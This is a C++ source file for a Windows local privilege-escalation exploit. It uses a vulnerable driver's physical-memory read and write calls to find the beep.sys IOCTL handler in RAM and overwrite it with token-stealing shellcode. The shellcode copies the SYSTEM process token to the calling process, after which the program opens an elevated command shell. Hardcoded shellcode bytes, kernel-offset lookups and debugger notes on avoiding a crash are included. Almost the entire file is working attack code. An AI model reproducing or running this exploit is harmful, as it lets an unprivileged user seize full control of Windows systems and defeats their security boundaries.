#include <vector>
#include <Windows.h>
#include <winternl.h>
#include <conio.h>

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

#include <intrin.h>

#include "proto.h"

typedef uint64_t QWORD;

BYTE my_shellcode[0x1000];

void __declspec(noreturn) bye()
{
	printf("Press any key to exit\n");
	(void)_getwche();
	exit(0);
}

void hexdump(unsigned char* buf, size_t len)
{
	for (int i = 0; i < len; i++)
		printf("%02x ", buf[i]);
	printf("\n");
}



// struct stolen from https://githacks.org/_xeroxz/vdm/-/blob/master/VDM/util/util.hpp
#pragma pack (push, 1)
struct PhysicalMemoryPage//CM_PARTIAL_RESOURCE_DESCRIPTOR
{
	uint8_t type;
	uint8_t shareDisposition;
	uint16_t flags;
	uint64_t pBegin;
	uint32_t sizeButNotExactly;
	uint32_t pad;

	static constexpr uint16_t cm_resource_memory_large_40{ 0x200 };
	static constexpr uint16_t cm_resource_memory_large_48{ 0x400 };
	static constexpr uint16_t cm_resource_memory_large_64{ 0x800 };

	uint64_t size()const noexcept
	{
		if (flags & cm_resource_memory_large_40)
			return uint64_t{ sizeButNotExactly } << 8;
		else if (flags & cm_resource_memory_large_48)
			return uint64_t{ sizeButNotExactly } << 16;
		else if (flags & cm_resource_memory_large_64)
			return uint64_t{ sizeButNotExactly } << 32;
		else
			return uint64_t{ sizeButNotExactly };
	}

};
static_assert(sizeof(PhysicalMemoryPage) == 20, "PhysicalMemoryPage size wrong");
#pragma pack (pop)


struct physical_memory_layout_info_t {
	QWORD idk;
	QWORD idk2;
	ULONG count;
	PhysicalMemoryPage pmi[];
} *physical_memory_layout_info = NULL;

#pragma pack(push, 1)
struct ioctl_header
{
	WORD pad;
	DWORD iv_size;
	unsigned __int8 iv[21];
	unsigned __int8 key[16];
	unsigned __int8 pad2[3]; // alignment i guess
};

struct ioctl_footer
{
	DWORD cmd_size;
	WORD pad;
};
#pragma pack(pop)

size_t my_shellcode_data_sz = 0;
MyIrpStruct* my_shellcode_data = 0;


#pragma pack(push, 1)
struct driver_cmd
{
	union {
		DWORD physicalAddress;
		DWORD readOutValue32;
		WORD readOutValue16;
		BYTE readOutValue8;
	};
	DWORD writeValue;
	uint64_t granularity;
};
#pragma pack(pop)

HANDLE hDevice;
HANDLE hBeep;

BOOL DriverCall(DWORD opcode, driver_cmd* args)
{
	//printf("input buf: %p\n", ioctl_data);
	//printf("input buf is %zx bytes\n", in_buf_size);

	DWORD bytes_returned = 0;

	BYTE out_buf[0x1000];
	memset(out_buf, 0x69, sizeof(out_buf));

	DWORD inBufSize = sizeof(*args);
	DWORD outBufSize = 4;
	BOOL result = DeviceIoControl(hDevice, opcode, args, inBufSize, args, outBufSize, &bytes_returned, NULL);
	//printf("result = %d\n", result);
	//if (!result) printf("Failed to read at %p: %x\n", args->physicalAddress, GetLastError());
	//printf("bytes_returned = %x\n", bytes_returned);

	if (!result && GetLastError() != 8)
		abort();

	return result;
}

#define OPCODE_READ_PHYSMEM 0x229350
#define OPCODE_WRITE_PHYSMEM 0x22934C

BOOL ReadPhysicalByte(uint64_t phys_addr, BYTE* out_buf)
{
	driver_cmd cmd;
	memset(&cmd, 0, sizeof(cmd));
	cmd.physicalAddress = phys_addr;
	cmd.granularity = 1;
	BOOL succ = DriverCall(OPCODE_READ_PHYSMEM, &cmd);
	if (succ) {
		*out_buf = cmd.readOutValue8;
		//printf("read physical at %p = %02x\n", phys_addr, cmd.readOutValue8);
	}
	return succ;
}

BOOL WritePhysicalByte(uint64_t phys_addr, BYTE value)
{
	driver_cmd cmd;
	memset(&cmd, 0, sizeof(cmd));
	cmd.physicalAddress = phys_addr;
	cmd.writeValue = value;
	cmd.granularity = 1;
	return DriverCall(OPCODE_WRITE_PHYSMEM, &cmd);
}

BOOL ReadPhysical(uint64_t phys_addr, DWORD len, void* buf)
{
	for (DWORD i = 0; i < len; i++) {
		if (!ReadPhysicalByte(phys_addr + i, &((BYTE*)buf)[i]))
			return FALSE;
	}
	return TRUE;
}

BOOL WritePhysical(uint64_t phys_addr, DWORD len, const void* buf)
{
	for (DWORD i = 0; i < len; i++) {
		if (!WritePhysicalByte(phys_addr + i, ((BYTE*)buf)[i]))
			return FALSE;
	}
	return TRUE;
}

// page offset of our victim ioctl handler in beep.sys
QWORD ioctl_handler_pageOffset = 0x270;

BOOL found_ioctl = FALSE;

struct code_backup_t
{
	uint64_t phys_addr;
	BYTE page_contents[0x1000];
};

std::vector<code_backup_t> beepBackup;

void ScanPages(uint64_t start, uint64_t end)
{
	printf("Scanning memory at %p-%p\n", (void*)start, (void*)end);

	unsigned char beepPattern[53] = {
			0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00,
			0x00, 0x4C, 0x8B, 0xD2, 0x41, 0x8B, 0x40, 0x18, 0x2D, 0x00, 0x00, 0x01,
			0x00, 0x0F, 0x84, 0x63, 0x04, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85,
			0x4A, 0x04, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x83, 0x78, 0x08, 0x08, 0x0F,
			0x82, 0x46, 0x04, 0x00, 0x00
	};

	for (QWORD phys_addr = start; phys_addr < end; phys_addr += 0x1000)
	{
		if (phys_addr % 0x100000 == 0)
		{
			printf("%p\r", (void*)phys_addr);
		}

		for (QWORD j = 0; j < sizeof(beepPattern); j++)
		{
			BYTE b = 0;
			BOOL succ = ReadPhysicalByte(phys_addr + ioctl_handler_pageOffset + j, &b);
			if (!succ)
				goto next;
			if (beepPattern[j] != b)
				goto next;
		}

		{
			QWORD page_addr = phys_addr;
			QWORD beep_ioctl = page_addr + ioctl_handler_pageOffset;
			printf("\nFound beep.sys ioctl at %p\n", (void*)beep_ioctl);

			// back up the page contents (as we smash the original beep code, that will get called when our process closes beep handle).
			code_backup_t backup;
			backup.phys_addr = page_addr;
			ReadPhysical(page_addr, 0x1000, backup.page_contents);
			beepBackup.emplace_back(backup);

			WritePhysical(beep_ioctl, 0x1000 - ioctl_handler_pageOffset, my_shellcode);
			found_ioctl = TRUE;
		}

	next:;
	}
}

void ScanPhysical()
{
	Beep(440, 10);

	// 1. Scan physical memory for Beep.sys
	// 2. Overwrite the ioctl handler of Beep.sys in physical memory with our shellcode
	// 3. In shellcode we call ntoskrnl.exe!memcpy with controlled arguments (from IRP)
	// 4. Now we have arb write primitive
	// 5. then do the rest of the shit

	for (unsigned i = 0; i < physical_memory_layout_info->count; i++)
	{
		uint64_t start = physical_memory_layout_info->pmi[i].pBegin;
		uint64_t end = start + physical_memory_layout_info->pmi[i].size();
		if (start > 0xFFFFFFFF)
		{
			printf("memory region %p-%p lies above 4GiB which we cannot access. fail\n", start, end);
			bye();
		}
		ScanPages(start, end);
	}

	if (!found_ioctl)
	{
		printf("didn't find beep.sys\n");
		bye();
	}

	hexdump((BYTE*)my_shellcode_data, my_shellcode_data_sz);

	QWORD ntPsInitialSystemProcess = ((uint64_t)my_shellcode_data->ntoskrnl + 0x53F2E0);
	printf("nt!PsInitialSystemProcess = %p\n", ntPsInitialSystemProcess);

	printf("ready kids?\n");

	fflush(stdout);
	_getwche();

	char out_buf[16]; // doesnt really matter
	DWORD bytes_returned;

	// get pointer to PsInitialSystemProcess and put in start of buffer (for priv escalation shellcode only)
	*(void**)my_shellcode_data = (void*)ntPsInitialSystemProcess;

	BOOL result = DeviceIoControl(hBeep, 0x1234, my_shellcode_data, my_shellcode_data_sz, out_buf, sizeof(out_buf), &bytes_returned, NULL);
	printf("trigger DeviceIoControl returns %d\n", result);

	// restore smashed beep code
	for (int i = 0; i < beepBackup.size(); i++)
	{
		WritePhysical(beepBackup[i].phys_addr, 0x1000, beepBackup[i].page_contents);
		printf("restored code at %p\n", (void*)beepBackup[i].phys_addr);
	}

	/*
	avoiding fault in windbg:
	
	0: kd> u MiShowBadMapper L20
nt!MiShowBadMapper:
fffff801`0a141ac4 48895c2410      mov     qword ptr [rsp+10h],rbx
fffff801`0a141ac9 48896c2418      mov     qword ptr [rsp+18h],rbp
fffff801`0a141ace 4889742420      mov     qword ptr [rsp+20h],rsi
fffff801`0a141ad3 57              push    rdi
fffff801`0a141ad4 4881ec90000000  sub     rsp,90h
fffff801`0a141adb 488b050e511600  mov     rax,qword ptr [nt!_security_cookie (fffff801`0a2a6bf0)]
fffff801`0a141ae2 4833c4          xor     rax,rsp
fffff801`0a141ae5 4889842480000000 mov     qword ptr [rsp+80h],rax
fffff801`0a141aed 8a1de7ad1900    mov     bl,byte ptr [nt!MiState+0x1eda (fffff801`0a2dc8da)]

	then write 2 to nt!MiState+0x1eda (fffff801`0a2dc8da
	eb  fffff801`0a2dc8da 2

	*/

	return;
}

void QueryPhysicalMemoryLayout()
{
	HKEY h_key;
	DWORD type, size = 0;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", 0, KEY_READ, &h_key);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, NULL, &size); //get size
	if (!size)
	{
		printf("WTf can't open the key\n");
		bye();
	}
	BYTE* data = (BYTE*)malloc(size);
	RegQueryValueEx(h_key, ".Translated", NULL, &type, (BYTE*)data, &size);
	physical_memory_layout_info = (physical_memory_layout_info_t*)data;

	ULONG count = physical_memory_layout_info->count;
	if (!count)
	{
		printf("Query physical memory layout failed?\n");
		bye();
	}
	uint64_t total_pmem = 0;
	for (unsigned i = 0; i < count; i++)
	{
		uintptr_t end = physical_memory_layout_info->pmi[i].pBegin + physical_memory_layout_info->pmi[i].size();
		printf("%p - %p , type %02x , flags %04x , sharing %02x\n", (void*)physical_memory_layout_info->pmi[i].pBegin, (void*)end, physical_memory_layout_info->pmi[i].type, physical_memory_layout_info->pmi[i].flags, physical_memory_layout_info->pmi[i].shareDisposition);
		total_pmem += physical_memory_layout_info->pmi[i].size();
	}
	printf("you seem to have %.1f gigabytes of physical memory mapped\n", (double)total_pmem/1e9);
}

void Get_kernel_offsets()
{
	typedef NTSTATUS (*NtQuerySystemInformation_t)(
			SYSTEM_INFORMATION_CLASS SystemInformationClass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength);

	NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

	constexpr int SystemModuleInformation = 0xb;
	ULONG bytes = 0;
	NTSTATUS status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 0, bytes, &bytes);
	if (!bytes)
	{
		printf("NtQuerySystemInformation fails 1\n");
		bye();
	}

	typedef struct _SYSTEM_MODULE_ENTRY
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];

	} 	SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION
	{
		ULONG               	ModulesCount;
		SYSTEM_MODULE_ENTRY		Modules[0];

	} 	SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

	PSYSTEM_MODULE_INFORMATION pMods = (PSYSTEM_MODULE_INFORMATION)malloc(bytes);
	RtlZeroMemory(pMods, bytes);
	status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pMods, bytes, &bytes);
	if (status < 0)
	{
		puts("NtQuerySystemInformation fails 2");
		bye();
	}
	printf("there are %u modules\n", pMods->ModulesCount);

	uint64_t ntoskrnl_base = 0;

	for (unsigned i = 0; i < pMods->ModulesCount; i++)
	{
		if (!strcmp("\\SystemRoot\\system32\\ntoskrnl.exe", (const char*)pMods->Modules[i].FullPathName))
		{
			printf("Found ntoskrnl at %p\n", pMods->Modules[i].ImageBase);
			ntoskrnl_base = (uint64_t)pMods->Modules[i].ImageBase;
			break;
		}
	}

	if (!ntoskrnl_base)
	{
		printf("Can't find address of ntoskrnl.exe\n");
		bye();
	}

	printf("ntoskrnl at %p\n", ntoskrnl_base);

	HMODULE hNtoskrnl = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNtoskrnl)
	{
		puts("failed to map ntoskrnl");
		bye();
	}

	my_shellcode_data->ntoskrnl = (void*)ntoskrnl_base;

	void* memcpy = (void*) GetProcAddress(hNtoskrnl, "memcpy");
	my_shellcode_data->nt_memcpy = (void (*)(void* dst, void* src, size_t len)) (ntoskrnl_base + (uint64_t)memcpy - (uint64_t)hNtoskrnl);
	printf("nt!memcpy at %p\n", my_shellcode_data->nt_memcpy);

	void* ExAllocatePoolWithTag = (void*)GetProcAddress(hNtoskrnl, "ExAllocatePoolWithTag");
	my_shellcode_data->nt_ExAllocatePoolWithTag = (void* (*)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag)) (ntoskrnl_base + (uint64_t)ExAllocatePoolWithTag - (uint64_t)hNtoskrnl);
	printf("nt!ExAllocatePoolWithTag at %p\n", my_shellcode_data->nt_ExAllocatePoolWithTag);

	void* PsCreateSystemThread = (void*)GetProcAddress(hNtoskrnl, "PsCreateSystemThread");
	my_shellcode_data->nt_PsCreateSystemThread = (NTSTATUS(*)(PHANDLE ThreadHandle, ULONG DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, void* ClientId, void* StartRoutine, PVOID StartContext)) (ntoskrnl_base + (uint64_t)PsCreateSystemThread - (uint64_t)hNtoskrnl);
	printf("nt!PsCreateSystemThread at %p\n", my_shellcode_data->nt_PsCreateSystemThread);

	void* IofCompleteRequest = (void*)GetProcAddress(hNtoskrnl, "IofCompleteRequest");
	my_shellcode_data->nt_IofCompleteRequest = (void*) (ntoskrnl_base + (uint64_t)IofCompleteRequest - (uint64_t)hNtoskrnl);
	printf("nt!IofCompleteRequest at %p\n", my_shellcode_data->nt_IofCompleteRequest);

	FreeLibrary(hNtoskrnl);
}

void Get_shellcode()
{
	// Shellcode for privilege escalation
	CONST BYTE ShellcodeBytes[] =
		"\x48\x8B\x4A\x18" // mov rcx, [rdx + _IRP.SystemBuffer]
		"\x48\x8B\x09" // mov rcx, [rcx] -- now points to nt!PsInitialSystemProcess (which is a pointer to eprocess)
		// The shellcode takes the address of a pointer to a process object in the kernel in the first
		// argument (RCX), and copies its security token to the current process.
		//
		// 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
		// -00
		// 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
		// 00000010  488B09            mov rcx, [rcx]
		// 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
		// 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
		// 00000021  C3                ret
		"\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00"
		"\x48\x8B\x09\x48\x8B\x89\x58\x03\x00\x00\x48\x89\x88\x58\x03\x00"
		"\x00\xC3";

	memset(my_shellcode, 0, sizeof(my_shellcode));
	memcpy(my_shellcode, ShellcodeBytes, sizeof(ShellcodeBytes));
}

void Setup_payload()
{
	char payload[] = { 0xc3 };
	size_t payload_sz = sizeof(payload);
	my_shellcode_data_sz = sizeof(MyIrpStruct) + payload_sz;
	my_shellcode_data = (MyIrpStruct*)malloc(my_shellcode_data_sz);
	if (!my_shellcode_data)
	{
		printf("malloc fails\n");
		bye();
	}
	memcpy(my_shellcode_data->payload, payload, payload_sz);
	my_shellcode_data->payload_size = payload_sz;
	printf("fake irp handler data block size = %llx\n", my_shellcode_data_sz);
}

int main()
{
	Setup_payload();
	Get_kernel_offsets();
	Get_shellcode();

	QueryPhysicalMemoryLayout();

	hBeep = CreateFileA("\\\\.\\GlobalRoot\\Device\\Beep", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hBeep = %p\n", hBeep);

	if (hBeep == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	hDevice = CreateFileA("\\\\.\\GlobalRoot\\Device\\Driver", GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	printf("hDevice = %p\n", hDevice);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("GLE = %x\n", GetLastError());
		bye();
	}

	ScanPhysical();

	system("cmd");

	bye();
}
